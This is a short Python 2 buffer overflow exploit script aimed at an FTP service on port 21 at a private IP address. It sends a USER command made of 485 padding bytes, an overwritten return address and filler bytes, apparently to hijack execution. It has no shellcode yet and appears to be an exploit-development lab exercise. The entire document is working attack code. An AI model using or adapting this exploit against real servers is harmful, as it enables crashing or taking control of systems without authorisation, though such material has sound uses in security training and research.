
#!/usr/bin/python
import socket

buf = "A" * 485 + "\xd7\x30\x9d\x7c"  + "C" * (1100-489)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.12",21))
r = s.recv(1024)
print r
s.send("User "+buf+"\r\n")
r = s.recv(1024)
print r
